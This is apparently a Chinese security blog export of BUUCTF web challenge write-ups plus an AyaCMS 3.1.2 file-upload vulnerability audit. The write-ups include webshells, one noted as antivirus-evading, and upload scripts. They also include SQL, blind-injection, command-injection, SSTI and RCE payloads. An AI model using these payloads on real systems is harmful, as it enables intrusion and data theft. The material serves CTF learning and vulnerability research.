以上&lt;?=$_=[]?&gt;&lt;?=$_=\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$______=$__++?&gt;&lt;?=$_______=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$__++?&gt;&lt;?=$________=$__++?&gt;&lt;?=$_________________=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__________=$__++?&gt;&lt;?=$_________=$________.$__________.$________.$_________________.$____.$_____?&gt;&lt;?=($_________)($&#123;'_'.$_______.$______.$________.$_________________&#125;[_])?&gt;    // 可做免杀马 不能直接POST提交 会报 Parse error: syntax error, unexpected '&lt;', expecting end of file in// 编码也没用\n\n\n绕过 open_basedir/disable_function\nopen_basedir是php.ini中的一个配置选项它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名。举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。\n\npayload\nchdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;));\n\n也可以用蚁剑 disable_functions 插件绕过\n解题过程打开得到一份代码\n&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     # 构建路径    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);    if(!file_exists($userdir))&#123;    # 创建路径    mkdir($userdir);    &#125;    # 判断文件是否上传    if(!empty($_FILES[\"file\"]))&#123; \t\t# 拿到上传的临时文件名        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];        # 拿到文件名        $name = $_FILES[\"file\"][\"name\"];        # 拿到后缀        $extension = substr($name, strrpos($name,\".\")+1);     # 后缀不能存在 ph    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\");     # 文件内容不能存在 &lt;?    if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\");    # 通过文件头判断是否为常见的图片文件类型    if(!exif_imagetype($tmp_name)) die(\"^_^\");         $path= $userdir.\"/\".$name;        # 将文件保存到刚刚创建的路径下        @move_uploaded_file($tmp_name, $path);        # 输出路径        print_r($path);    &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;# 传入字符长度不能大于18if(strlen($hhh)&gt;18)&#123;    die('One inch long, one inch strong!');&#125;# 不能有字母数字以及一些其他字符# 无字母webshell 不能用取反来构造if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) )    die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");# 代码执行 调用get_the_flageval($hhh);?&gt;\n\n代码审计通过审计，getshell可以分为两个步骤，第一步，先绕过条件 if ( preg_match(&#39;/[\\x00- 0-9A-Za-z\\&#39;&quot;\\反引号~_&amp;.,|=[\\x7F]+/i&#39;, $hhh) )  ，这个条件通过 异或的方式构造无字母webshell绕过。第二步：需要绕过三个条件，分别是 if(preg_match(&quot;/ph/i&quot;,$extension))，后缀不能带有ph。if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False)，文件内容中不能存在 &lt;?。if(!exif_imagetype($tmp_name)) ，文件头必须是常见图片类型文件头。绕过方式：通过上传.htaccess文件，在.htaccess文件中，需要伪造图片头来过第三个条件的检测 ，通常我们会想到GIF89a来绕过，但是这样会让.htaccess文件不能生效，这时可以通过 在.htaccess 头部添加#define width 1337 #define height 1337 绕过。然后再上传头部带有GIF89a、后缀名为jpg的一句话。\n第一步\n通过异或构造无字母webshell\n// $&#123;_GET&#125;&#123;_&#125;(); // 通过上面给的脚本 分别用 _ G E T 来作为异或目标// 得到_:%FF^%A0T:%FF^%ABG:%FF^%B8E:%FF^%BA// 组装$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();// phpinfo 测试$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=phpinfo\n\n\n没有问题，也可以直接执行get_the_flag。\n第二步\n上脚本\n\n再进行.htaccess 文件内容构建的时候，需要知道文件上传的路径，路径的构建规则,upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])，得到 upload/tmp_532fb014387262fa08e25fd65663cac2。\n\n\n这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则\n\nimport requestshtaccess = b\"\"\"#define width 1337#define height 1337AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg\"\"\"\"# 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则shell = \"GIF89a\"+\"aa\"+\"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\"# &lt;?php eval($_POST['cmd']);?&gt;url = 'http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag'# print(url)# 上传 .htaccess files = &#123;'file':('.htaccess', htaccess, 'image/jpeg')&#125;data = &#123;'upload':'submit'&#125;res = requests.post(url=url, data=data, files=files)print(res.text)# 上传shellfiles = &#123;'file':('shell.jpg', shell, 'image/jpeg')&#125;data = &#123;'upload':'submit'&#125;res = requests.post(url=url, data=data, files=files)print(res.text)\n\n执行\n\ngetshell蚁剑连接\n\n但是不能跳转到其他目录，使用蚁剑的disable_functions插件，辅助工具-&gt;绕过disable_functions-&gt;选择模式-&gt;PHP7_GC_UAF 。\n\n手动绕过open_basedir payloadurl: http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpgPOSTcmd=chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;));\n\n\n总结用无字母webshell的方式绕过正则对字母数字的匹配，通过上传.htaccess的方式绕过对正则对后缀的匹配，.htaccess为什么上传这个文件就能让上传的图片当做php文件执行呢？\n\n实际上就是apache的一个配置文件，也就是只有服务器是apache的时候可以这样做，nginx就不行。\n而 AddType 这个参数可以为当前目录下的 指定的后缀名添加MIME类型。\n刚刚我们设置的 AddType application/x-httpd-php .jpg 就是把.jpg后缀的MIME类型设置为 application/x-httpd-php，服务器去读取.jpg文件的时候会把它当成php文件读取，所以，里面的一句话就能执行。\n学到了不少。\n","categories":["CTF","BUUCTF"],"tags":["CTF","文件上传","无字母数字webshell","open_basedir/disable_function绕过"]},{"title":"BUUCTF-WEB 【SWPU2019】Web1 1","url":"/2021/04/13/%5BSWPU2019%5DWeb1%201/","content":"考点：无information_schema表注入二次注入\n流程注册-&gt;登录-&gt;发布广告-&gt;查看广告\npayload\n1'/**/group/**/by/**/22,'1-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22-1'/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22web1\troot@localhost-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22ads,users-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'223,flag&#123;fdc63c44-aae2-43da-9890-38992f50d843&#125;,53e217ad4c721eb9565cf25a5ec3b66e,098f6bcd4621d373cade4e832627b4f6,202cb962ac59075b964b07152d234b70select group_concat(b) from (select 1,2,3 as b union select * from users)a\n\n学到了两种新姿势\ninformation_schemab.tables 被过滤\ninformation_schemab.tables  替代表 mysql.innodb_table_statstable_schema 换成 database_name\n\n只知道表名的情况下查询数据\n(select `2` from (select 1,2,3 union select * from table_name)a) //前提是要知道表名((select c from (select 1,2,3 as c union select * from users)b)) 1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","二次注入","无information_schema表注入"]},{"title":"BUUCTF-WEB 【WUSTCTF2020】颜值成绩查询 1","url":"/2021/04/22/%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%201/","content":"考点：异或注入打开\n测试\n1^1^1 正常\n1^0^1 错误\n构造payload\n# 查表1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())), 1,1))&gt;0)^1# 查列1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')), 1,1))&gt;0)^1# 查数据1^(ord(substr((select(group_concat(flag,value))from(flag)), 1,1))&gt;0)^1\n\n表名\n[+] flag,score\n\n列名\n[+] flag,value\n\n上脚本\nimport requestsimport timedef payload(url, i, mid): # 猜解单个字段值    payload = \"1^(ord(substr((select(group_concat(value))from(flag)), %d,1))&gt;=%s)^1\"%(i,mid)    payload_url = url + payload    # time.sleep(1)    print(payload)    resp = requests.get(payload_url)    # 如果能够执行下列语句 则代表着 大于或等于    if \"admin\" in resp.text:        # 再次进行判断        payload = \"1^(ord(substr((select(group_concat(value))from(flag)), %d,1))=%s)^1\"%(i,mid)        payload_url = url + payload        time.sleep(1)        print(payload)        resp = requests.get(payload_url)        if \"admin\" in resp.text:        # 拿到目标数            return 200        else:            # 小于目标值            return 203    # 大于目标值    else:        return 400def exp(url):    column_value = \"\"    for i in range(1,300):        start = 33        end = 127        while start &lt;= end:            mid = (start + end) // 2            res = payload(url,i,mid)            print(\"[*] 返回码：\" + str(res))            # 代表找到            if res == 200:                print(\"[+] mid = \"+str(mid))                column_value += chr(mid)                break            # 代表是小于字符ascii码值            elif res == 203:                start = mid + 1             # 代表是大于 ascii码值            elif res == 400:                end = mid - 1        print(\"[+] \" + column_value)        if __name__=='__main__':    url = \"http://2881a64e-02bf-4c71-b948-26b1a1e6c0ae.node3.buuoj.cn/?stunum=\"    exp(url)\n\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","异或注入"]},{"title":"BUUCTF-WEB 【WUSTCTF2020】朴实无华 1","url":"/2021/04/14/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%201/","content":"代码审计和命令注入代码\n&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123;    $num = $_GET['num'];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\";    &#125;else&#123;        die(\"金钱解决不了穷人的本质问题\");    &#125;&#125;else&#123;    die(\"去非洲吧\");&#125;//level 2if (isset($_GET['md5']))&#123;   $md5=$_GET['md5'];   if ($md5==md5($md5))       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\";   else       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");&#125;else&#123;    die(\"去非洲吧\");&#125;//get flagif (isset($_GET['get_flag']))&#123;    $get_flag = $_GET['get_flag'];    if(!strstr($get_flag,\" \"))&#123;        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\";        system($get_flag);    &#125;else&#123;        die(\"快到非洲了\");    &#125;&#125;else&#123;    die(\"去非洲吧\");&#125;?&gt;\n\n三个地方的绕过\n$num = '1e5';   # payload   # 1e5\tif(intval($num) &lt; 2020&amp;&amp;intval($num +1)&gt;2021)&#123;       echo 'yes';       echo $num + 1;   &#125;// yes100001\n\n1e5为100000的科学计数法，将1e5 作为参数放入intval函数内执行会返回结果 1 , 将1e5 加上 1后，其结果为100001，在将100001放入intval，结果自然为100001，成功绕过。\n$md5=$_GET['md5'];   # payload       # 空数组       # 0e215962017   echo $md5;   if ($md5==md5($md5))&#123;       echo \"ok\";       echo $md5;   &#125;else&#123;       echo $md5;   &#125;\n\n这里的绕过其实有两种方式，我在网上看到的教程大部分都是用 0e215962017 字符串绕过，这串字符经过md5加密后，会得到前两位是 0e 开头的字符串，在经过 == 的比较，就会返回为真。\n还有一个方式就是空数组，这个方法在直接在代码里赋值是成立的，但是通过GET传参 md5[]= ，就不能显示，具体原因无从得知，md5对数组加密后会返回Flase ，再与空数组进行比较，会相等。\n$get_flag = $_GET['get_flag'];   if(!strstr($get_flag,\" \"))&#123;       $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);       echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\";       system($get_flag);   &#125;else&#123;       die(\"快到非洲了\");   &#125;\n\n不能有空格，cat会被替换成wctf2020，空格代替方式有很多 ${IFS} ${IFS}$9 &lt; 都可用代替空格，cat的代替方式也很多， more tac cat less head tail ，如果是被替换，还可用通过混淆来绕过，比如，cat 被过滤，通过c&quot;at 来绕过。\n最终payload\nfl4g.php?num=1e5&amp;md5=0e215962017&amp;get_flag=c\"\"at&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","命令注入"]},{"title":"BUUCTF-WEB 【b01lers2020】Welcome to Earth 1","url":"/2021/08/24/%5Bb01lers2020%5DWelcome%20to%20Earth%201/","content":"考点burp抓包\nF2源代码分析\n解题过程打开一个页面，只显示了几个单词。\n\n\n隔了几秒钟，跳转到 /ded/这个页面\n\n\nbp启动。\n\n经过分析，当event.keyCode == 27会跳转到 /chase/，那为什么不手动跳转？\n\n跳转 /leftt/\n\n\n点击 continue\n\n打开\n\n/open/\n\n得到\n\n/fight/\n\n最后得到\n\n我以为这里肯定很深奥，但是我想半天也没想明白，这个 scrable 函数到底起什么作用，我看了别人wp，只不过是障眼法，flag只需要把 check_action里的 flag 组合出来就行。\ngetflagpy一下，上脚本\nfrom itertools import permutationsimport reflag = [\"&#123;hey\", \"_boy\", \"aaaa\", \"s_im\", \"ck!&#125;\", \"_baa\", \"aaaa\", \"pctf\"]# 对flag字典里的内容进行排列组合item = permutations(flag)# 遍历for a in item:    k = ''.join(list(a))    # 匹配    if re.search('^pctf\\&#123;hey_boys[a-zA-z_]+ck!\\&#125;$', k):        print(k)\n\n得到\n\n第三个就是。\n总结这道题没我想象中那么复杂，确实没有什么难度，唯一学到的知识点，就是知道了一个排列组合的库 from itertools import permutations，这道题排在第三页，越往后做起的人越少，也越来越难，有点摸不着头脑。\n","categories":["CTF","BUUCTF"],"tags":["CTF","burp"]},{"title":"BUUCTF-WEB 【WesternCTF2018】shrine 1","url":"/2021/04/13/%5BWesternCTF2018%5Dshrine%201/","content":"SSTI注入题import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index():    return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine):    def safe_jinja(s):\t\t# Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。\t\t# 将( 和 ) 替换成 ''         s = s.replace('(', '').replace(')', '')        blacklist = ['config', 'self']        return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s\t# render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。    return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__':    app.run(debug=True)# payload# \"\".__class__# &#123;config['FLAG']&#125;&#125;# &#123;&#123;config.FLAG&#125;&#125;# &#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;# &#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;# &#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;\n\n可用payload\n&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;\n\n&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","SSTI"]},{"title":"【php代码审计】AyaCMS 3.1.2 任意文件上传漏洞","url":"/2022/11/20/%5Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5DAyaCMS%203.1.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","content":"漏洞描述在AyaCMS3.1.2的ajax.php文件中调用了一个文件文件上传函数，该函数未对文件后缀进行过滤，导致任意文件上传，可通过该上传接口上传webshell。\n漏洞版本AyaCMS 3.1.2\n环境搭建\nnginx 1.5.11\n\nphp 5.6.9 nts\n\nmysql 5.7.26\n\nayacms 3.1.2\n\n\n漏洞复现登录后台，位置在\n\n\n\n\n\n\n\n上传一个webshell\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n通过burp可以看到回显的文件名\n\n\n\n\n\n\n\n上传路径在代码中可以看到在AYA_ROOT根目录下的upload/~tmp/路径下，注意这里并不是网站根目录，而是在aya目录下。\n127.0.0.1:805/aya/upload/~tmp/16689195386710.php\n\n\n\n\n\n\n\n\n漏洞分析漏洞点入口在 ajax.php 424行\n\n\n\n\n\n\n\nupload_file分支中调用了一个upload的函数，我们跟进去\n\n\n\n\n\n\n\n包含了include/uploadifive/uploadifive.php 这个文件，继续跟进\n\n\n\n\n\n\n\n文件上传的关键代码在这个文件中，经过分析，可以发现，并未对上传文件经过任何处理，有一个验证文件后缀的黑名单还被注释掉了，可能是开发者疏忽了，所以可以直接上传php文件。\n修复建议增加文件后缀黑名单，对上传文件内容做验证。\n参考材料https://github.com/loadream/AyaCMS/issues/4\n","categories":["代码审计"],"tags":["php代码审计"]},{"title":"【web】一道TimelineSec团队入队题","url":"/2021/08/22/%5Bweb%5D%E4%B8%80%E9%81%93TimelineSec%E5%9B%A2%E9%98%9F%E5%85%A5%E9%98%9F%E9%A2%98/","content":"考点源码泄露\n代码审计\npreg_match绕过\n前置知识thinkphp助手函数助手函数\n\n助手函数对常用的函数进行了封装，（可以理解别名，但不能完全这么理解）大概如下几种。\n\n\napp\nurl\ninput\nredirect\nvalidate\ncookie\nenv\n\n这里主要讲 input。\n\ninput 有点类似与 $_GET $_POST \n\n语法格式\ninput(&apos;请求类型.]参数名[/变量修饰符]&apos;, &apos;默认值&apos;, &apos;过滤方法&apos;);\n\n获取某个请求类型的所有请求参数\n// 获取get请求类型的所有参数及其参数值// 返回值：一维数组// 键名：参数名，键值：参数值$array = input(&apos;get.&apos;);// 获取post请求类型的所有参数及其参数值// 返回值：一维数组// 键名：参数名，键值：参数值$array = input(&apos;post.&apos;);\n\n获取某个请求参数的值\n// 获取任何请求类型的name参数值$name = input(&apos;name&apos;);\n\n变量修饰符\n// 获取指定参数的值并将转为数字$id = input(&apos;id/d&apos;);\n\n参数默认值\n// 获取指定参数的值 没有获取到将返回默认值// 示例：如果id参数不存在，返回 666$id = input(&apos;id&apos;, 666);\n\n过滤方法\n// 获取指定参数的值再经过intval函数进行过滤$id = input(&apos;id&apos;,&apos;&apos;, &apos;intval&apos;);\n\n\n可用input 这个助手函数绕过正则对$_GET/$_POST等关键字过滤。\n\n解题过程打开\n报了403，紧接着扫扫目录。\n\n发现源码泄露，down下来。\n\n代码审计通过把代码放到Seay进行自动审计，得到结果。\n\n其他都是thinkphp框架的环境，这里直接开始审计第一个。\n路径：/app/controller/Index.php\n&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController&#123;    public function index()    &#123;        $white_fun = array(            'print',        );        if(isset($_GET['code']))&#123;            $code = $_GET['code'];            if(preg_match_all('/([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\&lt;\\&gt;\\%\\w\\s\\\\\\\\]+)?\\(/i', $code, $matches1)) &#123;                foreach ($matches1[1] as $value) &#123;                    echo $value.'&lt;/br&gt;';                    if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123;                        echo '加把劲~';                        exit;                    &#125;                &#125;            &#125;            if(preg_match('/(new)|(dump)|(content)|(f)|(php)|(base)|(evala)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\\\")|(\\/)|(\\&gt;)|(\\&lt;)|(~)|(\\&#123;)|(\\&#125;)|(\\.)|(,)|(`)|(\\$)|(_)|(\\^)|(!)|(%)|(\\+)|(\\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i', $code)) &#123;                echo '收手吧阿祖';                exit;            &#125;else&#123;                //var_dump($code);                eval($code);            &#125;        &#125;else&#123;            return '就挺秃然的。';        &#125;    &#125;    public function hello($name = 'ThinkPHP6')    &#123;        return 'hello,' . $name;    &#125;&#125;\n\n\n这里的路由规则看不太懂，但是不影响做题，直接访问 /public/ 这个路径就能执行到上面代码\n127.0.0.1:9999/public/\n\n分析要执行到eval($code)，需要经过两个条件\n第一个\nif(preg_match_all('/([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\&lt;\\&gt;\\%\\w\\s\\\\\\\\]+)?\\(/i', $code, $matches1)) &#123;                foreach ($matches1[1] as $value) &#123;                    echo $value.'&lt;/br&gt;';                    if (function_exists($value) &amp;&amp; ! in_array($value, $white_fun)) &#123;                        echo '加把劲~';                        exit;                    &#125;                &#125;&#125;\n\n分析：\n正则会匹配$_GET[‘code’] 接收的值，然后会通过函数 function_exists()判断 ，如果给定的函数已经被定义就返回true，当接收的值是一个被定义的函数名并且这个函数名又不在$white_fun数组中，程序就会终止。但是我发现当我当在函数名两边加上单引号，就不会被匹配到，并且还能执行，比如assert(); 这样会被匹配到，变成 ‘assert’()就不会，通过在本地测试，’assert’()能够执行。\n第二个\nif(preg_match('/(new)|(dump)|(content)|(f)|(php)|(base)|(evala)|(assert)|(system)|(exec)|(passthru)|(code)|(chr)|(ord)|(include)|(require)|(request)|(import)|(post)|(get)|(cookie)|(sess)|(server)|(copy)|(hex)|(bin)|( )|(\\\")|(\\/)|(\\&gt;)|(\\&lt;)|(~)|(\\&#123;)|(\\&#125;)|(\\.)|(,)|(`)|(\\$)|(_)|(\\^)|(!)|(%)|(\\+)|(\\|)|(dl)|(open)|(mail)|(env)|(ini)|(link)|(url)|(http)|(html)|(conv)|(add)|(str)|(parse)/i', $code)) &#123;                echo '收手吧阿祖';                exit;            &#125;else&#123;                //var_dump($code);                eval($code);            &#125;\n\n即便是绕过了第一个正则，很多函数还能被ban了，自己尝试了8进制编码绕过，但是由于过滤了双引号，不能执行成功，php编码函数绕过，大部分都被过滤，找到一个bzdecompress，但是需要开启bz2，默认是不开启，放弃了，还有就是通过数组，数组可以绕过过以上两个条件，但是最终值为 Array，显然达不到我想要的效果，最终问了出题师傅，提示了thinkphp的助手函数。助手函数，找到一个 input的助手函数，功能类似于 $_GET[&#39;name&#39;] ，前者比后者强大，前者所有方式传参都能接收，比如 $name = input(&#39;name&#39;);,GET、POST等都能传进来。\n构造payload在构造payload的时候，我思路太狭窄了。\n当时构造的是\n?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo();&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo()&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=@eval(base64_decode($_GET[z0]));&amp;z0=cGhwaW5mbygpOw==?code=&apos;input&apos;(&apos;name&apos;);&amp;name=@eval(base64_decode($_GET[z0]));&amp;z0=InBocGluZm8oKTsi?code=&apos;input&apos;(&apos;name&apos;);&amp;name=assert(&quot;phpinfo();&quot;);?code=&apos;input&apos;(&apos;name&apos;);&amp;name=`phpinfo();`\n\n发现没有回显，后来经过大师傅指点，这样传进去根本只是个字符串\n?code=&apos;input&apos;(&apos;name&apos;);&amp;name=eval(&quot;phpinfo();&quot;);我以为上边会执行 eval(&quot;phpinfo();&quot;); 但其实只是个字符串，感觉确实有点绕，只需要记住，eval只能执行当前传入的字符串一次。eval(&apos;input&apos;(&apos;name&apos;);)  等价于 input(&apos;name&apos;)\n\n\n最后实在想不出来什么招，就问了出题师傅payload。\n\n/public/?code=((%27input%27)(%27aun%27))((%27input%27)(%27cmd%27));&amp;aun=system&amp;cmd=whoami\n\n看到这个payload，我大吃一惊，我咋就没想到。\n于是自己也构造了一个payload\n?code=&apos;input&apos;(&apos;cmd&apos;)(&apos;input&apos;(&apos;value&apos;));&amp;cmd=system&amp;value=whoami\n\n也可以执行。\n拿 flag 的payload\n?code=&apos;input&apos;(&apos;cmd&apos;)(&apos;input&apos;(&apos;value&apos;));&amp;cmd=system&amp;value=/readflag\n\n总结我太菜了。\n","categories":["CTF","比赛复盘"],"tags":["代码审计","CTF","preg_match绕过","源码泄露"]},{"title":"BUUCTF-WEB 【安洵杯 2019】easy_serialize_php 1","url":"/2021/04/10/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php%201/","content":"考点：php反序列化字符长度逃逸分析 &lt;?php$function = @$_GET['f'];# 将变量$img 的内容中带有php flag php5 php4 fl1g 的字符串 替换成 '' 空字符function filter($img)&#123;    $filter_arr = array('php','flag','php5','php4','fl1g');    $filter = '/'.implode('|',$filter_arr).'/i';    return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123;    # 销毁$_SESSION 数组变量    unset($_SESSION);&#125;$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = $function;# 变量覆盖 意味着可以重置$_SESSION数组变量extract($_POST);# 如果$function 为空 则显示下面的代码 就是刚刚打开的时候显示的内容 意味着$function 没传入内容if(!$function)&#123;    echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';&#125;# $_GET['img_path'] 为空情况下会默认给定一个图片文件名 然后进行base64编码 赋值给SESSIONif(!$_GET['img_path'])&#123;    $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123;    # GET方式接收一个文件名 会进行base64编码 在此基础上还会进行sha1 加密 想从此处读取flag是不太可能    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;# 序列化SESSION 并对序列化内容进行过滤# 一般到这就会意识到问题存在 php序列化长度变化导致字符串逃逸$serialize_info = filter(serialize($_SESSION));# 给了三个分支 # highlight_file 显示源代码# phpinfo 可以查看php信息# show_imgage 对$serialize_info 进行序列化if($function == 'highlight_file')&#123;    highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123;    eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo['img']));&#125;\n\n查看php信息\n发现了特殊文件名d0g3_f1ag.php  \n$_SESSION[\"user\"] = 'guest';$_SESSION['function'] = 'a';$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码var_dump(serialize($_SESSION));// 得到string(90) \"a:3:&#123;s:4:\"user\";s:5:\"guest\";s:8:\"function\";s:1:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\"\n\n可控参数为user 和 function  ，序列化后会将 flag 过滤为 空字符串,\n$_SESSION[\"user\"] = 'flagflagflagflagflagflag';$_SESSION['function'] = 'a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";&#125;';$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码\n\n​    